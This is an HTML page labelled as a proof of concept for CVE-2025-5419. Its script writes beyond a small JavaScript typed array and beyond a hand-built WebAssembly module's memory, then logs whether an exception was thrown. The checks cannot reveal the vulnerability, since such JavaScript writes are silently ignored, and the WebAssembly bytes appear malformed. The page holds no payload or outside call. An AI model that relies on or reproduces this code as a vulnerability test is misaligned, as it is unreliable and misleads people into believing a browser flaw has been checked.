<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>POC</title>
</head>
<body>
  <h1>Testing CVE‑2025‑5419</h1>
  <pre id="status">Starting test...</pre>

  <script>
    const status = document.getElementById('status');
    function log(msg) {
      console.log(msg);
      status.textContent += "\n" + msg;
    }

    function tryJsOob() {
      log("Attempting JS typed array OOB test");
      try {
        const buf = new ArrayBuffer(8);
        const arr8 = new Uint8Array(buf);
        // Very out‑of‑bounds write
        arr8[1000] = 42;
        log("JS OOB write attempted without exception");
      } catch (e) {
        log("Caught JS error: " + e.message);
      }
    }

    async function tryWasm() {
      log("Attempting WASM memory test");
      // Minimal WASM module that has a memory export
      const wasmCode = new Uint8Array([
        0x00,0x61,0x73,0x6d, // "\0asm" magic
        0x01,0x00,0x00,0x00, // version 1
        // Type section
        0x01,0x07,0x01,0x60,0x00,0x00,
        // Memory section
        0x05,0x03,0x01,0x00,0x10,  // 1 memory, min 0, max 16 pages (~1MB)
        // Export section
        0x07,0x07,0x01,0x02,0x6d,0x65,0x6d,0x02,0x00,
        // Code section
        0x0a,0x04,0x01,0x02,0x00,0x0b
      ]);
      try {
        const {instance} = await WebAssembly.instantiate(wasmCode);
        log("WASM instantiated");
        const mem = instance.exports.mem;
        const u8 = new Uint8Array(mem.buffer);
        // Attempt OOB via WASM backing buffer
        const idx = u8.length + 100; 
        u8[idx] = 99;
        log("WASM OOB write attempted without exception");
      } catch (e) {
        log("Caught WASM error: " + e.message);
      }
    }

    window.onload = function() {
      log("Loaded test harness");
      tryJsOob();
      tryWasm();
      log("Finished attempts");
    };

  </script>
</body>
</html>

